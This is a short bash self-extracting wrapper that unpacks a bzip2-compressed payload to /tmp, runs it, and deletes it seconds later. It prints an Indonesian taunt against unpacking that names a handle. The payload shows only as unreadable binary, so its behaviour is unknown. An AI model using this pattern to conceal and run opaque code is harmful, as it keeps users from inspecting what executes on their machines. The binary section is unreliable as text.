#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYqB��  b߀@y�6G�����@�h  VT4mOL�����#L�L�L�d��
��i5�#!����&4�SM �0     J@LD���Si&�=OD� ��{R=��"�S���|�.�� � �B\X� J�9$���k]�����aU�_���9�	���ķ��J��&�& Z6�t�c�&O�Pr��CM�D�t�F	TN��A���~:�cm!��UG���������чS]�.+�;w�I:is�1��5�;�v��-ݓ���뵭����h]�psΰ�[�u+�x���~�:X|�z������֏'�������/K�7MO8�(h��CRp�xy�{����P�9섂��mc�y�n@r����ai�B��J�Y�!`�5�В��U4���уYgT��:�J^A�Cc�ݪ����0�O�vת�׊JY����~x�<>�xF2L��@���%FPzu`K-`Pl`��`����#�+��D!�`J%cP҅���L�VK��5�P�pi���I6%>$��s���@1�G}�x�#X�4�I�㓢����V�!�n�\hƑ74l�Kø:����ˆ���sKWcrܖ�-;�-aG{�s��Q2����B�����)���@